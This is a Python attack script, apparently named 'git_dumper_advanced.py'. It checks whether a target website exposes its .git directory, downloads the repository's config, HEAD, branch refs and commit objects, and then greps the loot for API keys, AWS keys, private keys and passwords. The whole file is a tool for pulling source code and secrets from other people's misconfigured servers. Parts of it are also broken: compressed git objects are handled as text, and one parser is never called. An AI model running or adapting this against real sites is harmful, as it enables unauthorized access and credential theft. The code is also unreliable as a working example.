#!/usr/bin/env python3

import os
import sys
import requests
import subprocess
import re
import json
from urllib.parse import urljoin
import tempfile
import shutil

class GitDumper:
    def __init__(self, url, output_dir):
        self.url = url.rstrip('/')
        self.out = output_dir
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Git-Dumper-Advanced'})

    def check_git(self):
        test_url = urljoin(self.url, '.git/HEAD')
        try:
            r = self.session.get(test_url, timeout=5)
            if 'ref: refs/heads/' in r.text:
                print(f"[+] .git exposed at {self.url}")
                return True
        except:
            pass
        return False

    def download_file(self, path):
        full_url = urljoin(self.url, f'.git/{path}')
        try:
            r = self.session.get(full_url, timeout=5)
            if r.status_code == 200:
                return r.text
        except:
            pass
        return None

    def parse_index(self, content):
        # Very simple index parser for demo
        # Real one handles tree objects
        files = re.findall(r'([a-f0-9]{40})\s+(\d+)\s+(\S+)', content)
        return [f[2] for f in files]

    def dump(self):
        os.makedirs(self.out, exist_ok=True)
        # Download config
        config = self.download_file('config')
        if config:
            with open(os.path.join(self.out, 'config'), 'w') as f:
                f.write(config)

        # Download HEAD
        head = self.download_file('HEAD')
        if head:
            with open(os.path.join(self.out, 'HEAD'), 'w') as f:
                f.write(head)

        # Try to get refs
        for ref in ['refs/heads/master', 'refs/heads/main', 'refs/heads/dev']:
            content = self.download_file(ref)
            if content:
                commit_hash = content.strip().split()[0]
                self.download_commit(commit_hash)

    def download_commit(self, commit_hash):
        # Download commit object
        obj = self.download_file(f'objects/{commit_hash[:2]}/{commit_hash[2:]}')
        if obj:
            with open(os.path.join(self.out, f'{commit_hash}.obj'), 'wb') as f:
                f.write(obj.encode())

    def scan_secrets(self):
        print("[*] Scanning for secrets...")
        for root, dirs, files in os.walk(self.out):
            for file in files:
                path = os.path.join(root, file)
                with open(path, 'r', errors='ignore') as f:
                    content = f.read()
                patterns = {
                    'API Key': r'[a-zA-Z0-9]{32,}',
                    'AWS Key': r'AKIA[0-9A-Z]{16}',
                    'Private Key': r'-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----',
                    'Password': r'password[\s]*[=:][\s]*[\'"]?[^\s"\']+',
                }
                for name, regex in patterns.items():
                    matches = re.findall(regex, content)
                    if matches:
                        print(f"[!] {name} found in {path}: {matches[:3]}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: git_dumper_advanced.py http://target.com/.git output_dir")
        sys.exit(1)
    gd = GitDumper(sys.argv[1], sys.argv[2])
    if gd.check_git():
        gd.dump()
        gd.scan_secrets()
    else:
        print("[-] .git not exposed")